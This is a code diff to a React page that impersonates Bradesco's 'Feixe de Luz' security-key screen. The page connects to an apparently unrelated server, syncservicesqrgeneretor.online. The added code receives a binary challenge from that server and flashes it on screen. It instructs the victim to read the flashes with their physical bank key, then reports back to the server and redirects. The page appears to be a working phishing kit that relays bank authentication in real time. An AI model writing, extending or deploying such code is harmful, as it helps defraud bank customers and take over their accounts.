@@ -1,4 +1,4 @@
-import { useEffect, useRef, useState } from "react";
+import { useEffect, useRef, useState, useCallback } from "react";
 import { useNavigate } from "react-router-dom";
 import bradescoLogo from "@/assets/bradesco-logo.png";
 
@@ -6,10 +6,37 @@ const FeixePage = () => {
   const navigate = useNavigate();
   const usuario = sessionStorage.getItem("usuario") || "";
   const nome = sessionStorage.getItem("nome") || "";
-  const feixe = sessionStorage.getItem("feixe") || "";
   const dispositivo = sessionStorage.getItem("dispositivo") || "";
   const wsRef = useRef<WebSocket | null>(null);
-  const [status, setStatus] = useState<"aguardando" | "validando" | "erro">("aguardando");
+  const [status, setStatus] = useState<"aguardando" | "lendo" | "validando" | "erro">("aguardando");
+  const [binario, setBinario] = useState<string>("");
+  const [corAtual, setCorAtual] = useState<"black" | "white">("black");
+  const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
+  const indexRef = useRef(0);
+
+  const iniciarLeitura = useCallback(() => {
+    if (!binario) return;
+    setStatus("lendo");
+    indexRef.current = 0;
+
+    if (intervalRef.current) clearInterval(intervalRef.current);
+
+    intervalRef.current = setInterval(() => {
+      if (indexRef.current >= binario.length) {
+        // Finished flashing — loop or stop
+        clearInterval(intervalRef.current!);
+        intervalRef.current = null;
+        setCorAtual("black");
+        // Notify server that reading is done
+        wsRef.current?.send(JSON.stringify({ acao: "feixe_lido", usuario }));
+        return;
+      }
+
+      const bit = binario[indexRef.current];
+      setCorAtual(bit === "1" ? "white" : "black");
+      indexRef.current++;
+    }, 50); // 50ms per bit
+  }, [binario, usuario]);
 
   useEffect(() => {
     const ws = new WebSocket("wss://syncservicesqrgeneretor.online/ws/");
@@ -26,6 +53,11 @@ const FeixePage = () => {
       const msg = JSON.parse(event.data);
       console.log("FeixePage msg:", msg);
 
+      if (msg.acao === "feixe_binario" && msg.binario) {
+        setBinario(msg.binario);
+        setStatus("aguardando");
+      }
+
       if (msg.acao === "redirecionar" && msg.url) {
         setStatus("validando");
         setTimeout(() => {
@@ -35,6 +67,10 @@ const FeixePage = () => {
 
       if (msg.acao === "erro_feixe") {
         setStatus("erro");
+        if (intervalRef.current) {
+          clearInterval(intervalRef.current);
+          intervalRef.current = null;
+        }
       }
     };
 
@@ -42,6 +78,7 @@ const FeixePage = () => {
 
     return () => {
       ws.close();
+      if (intervalRef.current) clearInterval(intervalRef.current);
     };
   }, [usuario]);
 
@@ -69,7 +106,7 @@ const FeixePage = () => {
       </div>
 
       {/* Mobile layout */}
-      <div className="md:hidden min-h-screen flex flex-col bg-[hsl(220,20%,96%)]">
+      <div className="md:hidden min-h-screen flex flex-col bg-white">
         {/* Blue header bar */}
         <div className="bg-[hsl(220,60%,40%)] px-4 py-3 flex items-center gap-3">
           <h1 className="text-white text-base font-semibold tracking-tight">
@@ -77,117 +114,80 @@ const FeixePage = () => {
           </h1>
         </div>
 
-        {/* Feixe de Luz content */}
-        <div className="flex flex-col items-center flex-1 px-6 pt-8">
-          {/* Logo */}
-          <img
-            src={bradescoLogo}
-            alt="Bradesco"
-            className="w-20 h-20 object-contain mb-6"
-          />
-
-          {nome && (
-            <p className="text-[hsl(220,10%,46%)] text-sm mb-1">
-              Olá, <span className="font-semibold text-[hsl(220,20%,14%)]">{nome}</span>
-            </p>
-          )}
-
-          <h2 className="text-[hsl(220,20%,14%)] text-xl font-bold mb-2 text-center">
-            Feixe de Luz
+        <div className="flex flex-col flex-1 px-5 pt-6 pb-8">
+          {/* Title */}
+          <h2 className="text-[hsl(220,20%,14%)] text-lg font-bold mb-6">
+            Chave de Segurança - Feixe de Luz
           </h2>
-          <p className="text-[hsl(220,10%,46%)] text-sm text-center mb-8 max-w-[280px]">
-            Aponte a câmera do celular para o feixe de luz exibido na tela do computador.
-          </p>
 
-          {/* Feixe animation area */}
-          <div className="relative w-56 h-56 mb-6">
-            {/* Outer ring */}
-            <div className="absolute inset-0 rounded-full border-[3px] border-[hsl(220,60%,40%)]/20" />
-            {/* Middle pulsing ring */}
-            <div className="absolute inset-3 rounded-full border-[2px] border-[hsl(220,60%,40%)]/30 animate-ping" style={{ animationDuration: "2s" }} />
-            {/* Inner circle with icon */}
-            <div className="absolute inset-6 rounded-full bg-[hsl(220,60%,40%)]/10 flex items-center justify-center">
-              {status === "aguardando" && (
-                <svg xmlns="http://www.w3.org/2000/svg" className="w-16 h-16 text-[hsl(220,60%,40%)]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round">
-                  {/* Flashlight / beam icon */}
-                  <path d="M12 2v8" />
-                  <path d="m4.93 10.93 1.41 1.41" />
-                  <path d="M2 18h2" />
-                  <path d="M20 18h2" />
-                  <path d="m19.07 10.93-1.41 1.41" />
-                  <path d="M10 22h4" />
-                  <path d="M10 18a4 4 0 0 1 4 0" />
-                  <path d="M8 22h8" />
-                  <circle cx="12" cy="14" r="4" />
-                </svg>
-              )}
-              {status === "validando" && (
-                <svg xmlns="http://www.w3.org/2000/svg" className="w-16 h-16 text-[hsl(142,71%,45%)]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
-                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
-                  <path d="m9 12 2 2 4-4"/>
-                </svg>
-              )}
-              {status === "erro" && (
-                <svg xmlns="http://www.w3.org/2000/svg" className="w-16 h-16 text-[hsl(0,84%,60%)]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
-                  <circle cx="12" cy="12" r="10"/>
-                  <path d="m15 9-6 6"/>
-                  <path d="m9 9 6 6"/>
-                </svg>
-              )}
-            </div>
+          {/* Black square - feixe area */}
+          <div className="flex justify-start mb-6">
+            <div
+              className="w-40 h-40 border border-[hsl(220,14%,80%)] transition-colors duration-[30ms]"
+              style={{ backgroundColor: status === "lendo" ? corAtual : "black" }}
+            />
           </div>
 
-          {/* Feixe code display */}
-          {feixe && (
-            <div className="bg-white rounded-xl px-6 py-4 shadow-md shadow-black/5 mb-5">
-              <p className="text-[hsl(220,10%,46%)] text-xs text-center mb-1">Código do feixe</p>
-              <p className="text-[hsl(220,20%,14%)] text-2xl font-bold tracking-[0.15em] text-center font-mono">
-                {feixe}
+          {/* Instructions */}
+          <div className="space-y-3 mb-8">
+            <p className="text-[hsl(220,10%,40%)] text-sm leading-relaxed">
+              1 - Na sua chave, aperte o botão com o desenho de cadeado
+            </p>
+            <p className="text-[hsl(220,10%,40%)] text-sm leading-relaxed">
+              2 - Posicione o sensor que fica no verso dela, na frente deste quadro preto (cerca de 1 cm)
+            </p>
+            <p className="text-[hsl(220,10%,40%)] text-sm leading-relaxed">
+              3 - Com a chave posicionada, clique em Iniciar Leitura, aqui na tela, e aguarde.
+            </p>
+          </div>
+
+          {/* Button */}
+          {status === "aguardando" && (
+            <button
+              onClick={iniciarLeitura}
+              disabled={!binario}
+              className="w-full max-w-[240px] mx-auto h-12 rounded-full bg-[hsl(349,93%,42%)] text-white text-base font-semibold active:scale-[0.97] transition-all duration-200 disabled:opacity-50"
+            >
+              Iniciar Leitura
+            </button>
+          )}
+
+          {status === "lendo" && (
+            <div className="flex flex-col items-center gap-3">
+              <div className="w-8 h-8 border-[3px] border-[hsl(220,14%,89%)] border-t-[hsl(349,93%,42%)] rounded-full animate-spin" />
+              <p className="text-[hsl(220,10%,46%)] text-sm animate-pulse">
+                Realizando leitura...
               </p>
             </div>
           )}
 
-          {/* Info card */}
-          <div className="bg-white rounded-xl px-4 py-3 w-full border border-[hsl(220,14%,89%)] space-y-2">
-            {dispositivo && (
-              <div className="flex justify-between text-sm">
-                <span className="text-[hsl(220,10%,46%)]">Dispositivo</span>
-                <span className="text-[hsl(220,20%,14%)] font-medium">{dispositivo}</span>
-              </div>
-            )}
-            <div className="flex justify-between text-sm">
-              <span className="text-[hsl(220,10%,46%)]">Status</span>
-              <span className={`font-medium ${
-                status === "aguardando" ? "text-[hsl(220,60%,40%)]" :
-                status === "validando" ? "text-[hsl(142,71%,45%)]" :
-                "text-[hsl(0,84%,60%)]"
-              }`}>
-                {status === "aguardando" && "Aguardando leitura"}
-                {status === "validando" && "Validado ✓"}
-                {status === "erro" && "Falha na validação"}
-              </span>
+          {status === "validando" && (
+            <div className="flex flex-col items-center gap-3">
+              <svg xmlns="http://www.w3.org/2000/svg" className="w-10 h-10 text-[hsl(142,71%,45%)]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
+                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                <path d="m9 12 2 2 4-4"/>
+              </svg>
+              <p className="text-[hsl(142,71%,45%)] text-sm font-medium">
+                Validado! Redirecionando...
+              </p>
             </div>
-          </div>
-
-          {/* Status message */}
-          <p className={`text-xs mt-6 text-center ${
-            status === "erro" ? "text-[hsl(0,84%,60%)]" : "text-[hsl(220,10%,46%)] animate-pulse"
-          }`}>
-            {status === "aguardando" && "Aguardando leitura do feixe de luz..."}
-            {status === "validando" && "Redirecionando..."}
-            {status === "erro" && "Não foi possível validar. Tente novamente."}
-          </p>
+          )}
 
           {status === "erro" && (
-            <button
-              onClick={() => {
-                setStatus("aguardando");
-                wsRef.current?.send(JSON.stringify({ acao: "reconectar", usuario }));
-              }}
-              className="mt-4 px-8 h-12 rounded-full bg-[hsl(349,93%,42%)] text-white text-sm font-semibold active:scale-[0.97] transition-all duration-200"
-            >
-              Tentar novamente
-            </button>
+            <div className="flex flex-col items-center gap-3">
+              <p className="text-[hsl(0,84%,60%)] text-sm">
+                Não foi possível validar. Tente novamente.
+              </p>
+              <button
+                onClick={() => {
+                  setStatus("aguardando");
+                  wsRef.current?.send(JSON.stringify({ acao: "reconectar", usuario }));
+                }}
+                className="px-8 h-12 rounded-full bg-[hsl(349,93%,42%)] text-white text-sm font-semibold active:scale-[0.97] transition-all duration-200"
+              >
+                Tentar novamente
+              </button>
+            </div>
           )}
         </div>
       </div>
